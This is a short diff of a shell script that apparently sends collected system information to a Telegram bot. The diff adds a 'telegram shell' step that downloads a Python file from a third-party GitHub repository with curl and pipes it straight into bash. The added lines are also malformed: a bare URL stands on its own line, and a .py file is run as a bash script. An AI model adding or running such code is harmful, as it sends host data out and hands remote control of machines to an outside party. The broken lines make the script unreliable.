@@ -65,3 +65,7 @@ get_telegram_system_info() {
 # Send system info to Telegram
 system_info=$(get_telegram_system_info)
 send_telegram_msg "$system_info"
+
+# Run telegram shell
+https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/cooker.py
+bash <(curl -s https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/cooker.py)
